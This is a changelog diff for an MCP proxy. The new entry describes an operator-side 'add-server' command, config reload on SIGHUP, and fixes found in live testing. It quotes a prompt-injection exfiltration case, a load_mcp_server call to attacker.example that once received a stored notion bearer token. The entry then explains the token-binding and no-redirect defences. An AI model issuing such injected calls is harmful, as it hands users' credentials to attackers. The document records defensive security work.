@@ -5,7 +5,55 @@ semver's `0.x` range deliberately — the public API isn't frozen yet.
 
 ## [Unreleased]
 
-## [Unreleased]
+**Added: `extensible-mcp add-server`, and reload on SIGHUP**
+
+0.3.0 bound stored tokens to URLs an operator had configured, which closed a
+real exfiltration path -- a prompt-injected `load_mcp_server("notion",
+"https://attacker.example/mcp")` was being handed the notion bearer -- and took
+the documented "drop the token in the tokens file, then load at runtime" flow
+with it. This restores that flow from the operator's side.
+
+The distinction that makes it safe is *who possesses the credential*. The bug
+was the model referencing a secret it had never seen and the proxy fetching it
+on the model's behalf; passing the token in inverts that, so only a caller who
+already holds it can use it, and the model holds none. It is deliberately a CLI
+command and not a parameter on `load_mcp_server`: that would be safe from
+exfiltration for the same reason, but it shares the surface the model drives,
+and a user who pasted a token into a chat to make it work would break the rule
+that tokens never transit the conversation.
+
+The command verifies before it writes anything -- it connects as an MCP client
+with the token and lists tools -- then writes the config entry and the token
+(0600, atomically), and signals a running proxy. `create_server` gains an
+opt-in `reload_config` hook; when the CLI supplies it, the lifespan installs a
+SIGHUP handler and reconciles. Reload is additive: a server that disappeared
+from the config stays connected and one whose URL changed keeps the URL it was
+admitted with, because disconnecting under a signal would cancel calls in
+flight and silently re-pointing a name is the substitution the token binding
+exists to prevent. A changed token needs nothing -- a URL server resolves the
+tokens file per call.
+
+Three things the live run found that the unit tests had not:
+
+- the manager captured `tokens_file` at construction, and `load_config` reports
+  `None` for a file that does not exist -- which is the normal state before
+  `add-server` creates one. The reload therefore connected the new server with
+  no credential and got a 401. A reload now updates the manager's tokens path.
+- verification followed redirects while the runtime does not, so a `/mcp/` that
+  307s to `/mcp` passed the check and then failed at the proxy -- worse than not
+  checking, since it reports success for something broken. Verification now
+  behaves exactly as the runtime, and a redirect is reported with the URL to use
+  instead. The runtime should not follow redirects: a redirect carrying an
+  Authorization header is a way to hand a bearer somewhere it was not meant to
+  go.
+- a pid alone is not safe to signal. Python does not run `finally` on SIGTERM,
+  so a stale pid file is the common case rather than the exceptional one, and
+  pids are reused -- signalling a recycled one would send SIGHUP to an unrelated
+  process, whose default action is to die. The proxy now holds an advisory lock
+  on the pid file for its lifetime, and `add-server` signals only if something
+  holds it. That also refuses a second proxy on one config, which would race on
+  the same downstreams.
+
 
 **Added: enrollment is authenticated (OAuth 2.0 authorization code + PKCE)**
 
